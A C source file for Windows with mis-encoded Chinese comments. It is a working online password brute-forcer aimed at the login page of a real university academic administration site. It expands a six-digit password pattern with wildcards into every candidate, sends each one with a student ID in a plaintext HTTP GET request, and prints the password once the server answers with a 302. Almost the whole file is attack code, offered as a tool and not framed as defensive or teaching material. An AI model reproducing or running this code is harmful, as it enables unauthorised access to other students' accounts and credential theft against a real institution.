#include<winsock.h>
#include<string.h>
#include<stdio.h>
#include<conio.h>
#include<math.h>
#pragma comment(lib, "ws2_32.lib") 
int ShowLast(int last)
{/*������ʵʱ��ʾʣ�������������-1��ʾ�ɹ�������-2��ʾʧ��*/
	char t[7] = {0};
	if (last == -1)
		SetConsoleTitle("Succeed");
	else if (last == -2)
		SetConsoleTitle("Fail");
	else
		SetConsoleTitle(_itoa(last,t,10));
	return 0;
}
/*char* QueryWebSite(char *stuid,char *pwd)
{/*���ݴ����ѧ�š����룬���������½ҳ�淢��GET���󣬳ɹ��򷵻�ǰ20�ֽڣ����򷵻ؿ�*/
/*	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0}; 
	char text[21] = {0}; 

	if (WSAStartup(MAKEWORD(2,2), &WSAData)) 
		return NULL;
	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,pwd);
	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
	send(sockinf, header, strlen(header), 0); 

	recv(sockinf, text, 20, 0);

	closesocket(sockinf); 
	WSACleanup(); 
	return text;
}*/
int CheckLogin(char *SiteInfo)
{/*���ݴ������ҳ�����ַ����жϱ��γ����Ƿ���ȷ������ȷ�򷵻�1�����򷵻�0*/
	if (!strstr(SiteInfo,"302"))//ʧ�����
		return 0;
	return 1;
}
int CreatePwdList(char *pwd,char ***pwdList)
{/*���ɴ�ʹ�õ������pwdList��������������������*/
	register int i,ti,j,k=0,n=0,tnum=0;//ͨ��������������ص��������
	int max,min;//�ܴﵽ�������������
	int type=0;//type10:�����λ��type100:�����λ��θ�λ
	for (j=5;j>=0;j--)//����type
	{
		if (pwd[j] == '?')//�����ҵ�ͨ�����������λ��+1
		{
			n++;
			if (j == 0 && pwd[j+1] != '?')//���λΪͨ���
				type += 10;
			else if (j == 0 && pwd[j+1] == '?')//���λ��θ�λΪͨ���
				type += 100;
		}
	}
	switch (type)
	{
	case 0:
		tnum = pow(10.0,n);
		max = tnum - 1;
		min = 0;
		break;
	case 10:
		tnum = 4 * pow(10.0,n-1);
		min = 0;
		max = 4 * pow(10.0,n-1) - 1;
		break;
	case 100:
		tnum = 31 * pow(10.0,n-2);
		min = pow(10.0,n-2);
		max = tnum + min - 1;
		break;
	default:
		break;
	}
	*pwdList = (char**)malloc(tnum*sizeof(char*));
	for (i=0;i<tnum;i++)
		(*pwdList)[i] = (char*)malloc(7*sizeof(char));//��ʼ�������
	for (i=min;i<=max;i++)//��������
	{
		strcpy((*pwdList)[k],pwd);
		ti = i;
		for (j=5;j>=0;j--)
		{
			if ((*pwdList)[k][j] == '?')
			{
				(*pwdList)[k][j] = ti % 10 + '0';
				ti /= 10;
			}
		}
		k++;
	}
	return tnum;
}

int CheckBegin(char *stuid,char *pwd)
{/*���������	pwd(�����ʽ��)*/
	char **PwdList = NULL;//ָ�������
	char *sitebuf = NULL;//���ҳ������
	int tnum,PwdNum;//ʣ������������������
	register int i,Ftime=0;

	/*�׽��ֳ�ʼ������*/
	int timeout = 60000;//��ʱ1����
	int TimedOutFlag = 0;
	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0}; 
	char text[21] = {0}; 
	if (WSAStartup(MAKEWORD(2,2), &WSAData))
	{
		printf("\n\n�׽�������ʧ�ܣ�\n");
		return 0;
	}
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	if (!pURL)
	{
		printf("\n\n���ͳһ��λ��ʧ�ܣ�\n");
		return 0;
	}
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	setsockopt(sockinf,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(int));//����recv��ʱΪ1����

	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//������������ظ���
	printf("\n��%d������������",PwdNum);
	for (i=0;i<PwdNum;i++)
	{
		/*�׽��ֳ�ʼ�����ѯ����Ϊ�˼���*/
		TimedOutFlag = 0;
		do
		{
			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,PwdList[i]);
			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
			send(sockinf,header,strlen(header),0); 
			if (recv(sockinf,text,20,0) == -1)//���񵽳�ʱ
				TimedOutFlag = 1;
			sitebuf = text;
			closesocket(sockinf);
		}while(TimedOutFlag);//��һ�γ�ʱ

		//sitebuf = QueryWebSite(stuid,PwdList[i]);//��ѯ������ҳ����
		if (!sitebuf)//��Ϊ�գ�ʧ�ܴ���+1
		{
			if (Ftime < 10)
				Ftime++;
			else
			{
				Ftime = 0;
				if (IDNO == MessageBox(NULL,"��ҳ����ʧ�ܴ����ﵽ10�Σ��Ƿ�ȴ�����ֱ���˳�����","Something wrong!",MB_YESNO))
				{
					printf("\n\n�û�ѡ������ֹ����\n");
					break;//�û�ѡ��ֹͣ����
				}
				i--;
			}
		}
		else
		{
			tnum--;
			ShowLast(tnum);//��������ʾʣ���������
			if (CheckLogin(sitebuf))//��¼�ɹ�����ʾ���˳�ѭ��
			{
				ShowLast(-1);
				printf("\n\n�ҵ���ȷ�����룡\nPwd = %s\n",PwdList[i]);
				break;
			}
		}
	}
	if (i == PwdNum)//�������ȫ�����ԣ�û���ҵ���ȷ������
	{
		ShowLast(-2);
		printf("\n\n��������޷��ҵ���ȷ�����룡\n");
	}
	for (i=0;i<PwdNum;i++)
		free(PwdList[i]);//�ͷ��ڴ�
	
	WSACleanup();//����׽���
	return 0;
}

int main()
{
	char stuid[10] = {0};//ѧ��
	char pwd[7] = {0};//����
	printf("������ѧ�ۺϽ������ϵͳ��¼�����һ�\n--�뱣֤δ�Ĺ�ԭʼ����(���֤����λ)��������Ч\n--��λ��������������1234??��ʾ����123400~123499\n--��ʼ�һ��������������Զ�����ʣ�ೢ����\n\n");
	printf("�����λѧ�ţ�");
	gets_s(stuid,10);
	printf("������λ���룺");
	gets_s(pwd,7);
	CheckBegin(stuid,pwd);//��ʼ���

	system("pause");
	
	return 0;
}